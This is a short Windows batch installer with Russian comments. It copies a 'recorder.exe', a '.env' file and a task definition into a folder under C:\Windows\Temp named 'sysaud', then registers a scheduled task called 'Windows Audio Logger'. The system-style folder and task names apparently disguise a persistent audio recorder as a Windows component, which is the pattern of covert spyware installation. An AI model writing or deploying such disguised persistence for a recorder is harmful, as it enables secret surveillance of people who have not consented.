@echo off
setlocal

:: Копируем exe и env в целевую папку
set TARGET_DIR=C:\Windows\Temp\sysaud
mkdir %TARGET_DIR%
copy recorder.exe %TARGET_DIR%
copy .env %TARGET_DIR%
copy task.xml %TARGET_DIR%

:: Регистрируем задачу
schtasks /Create /TN "Windows Audio Logger" /XML "%TARGET_DIR%\task.xml" /F

echo Установка завершена.
pause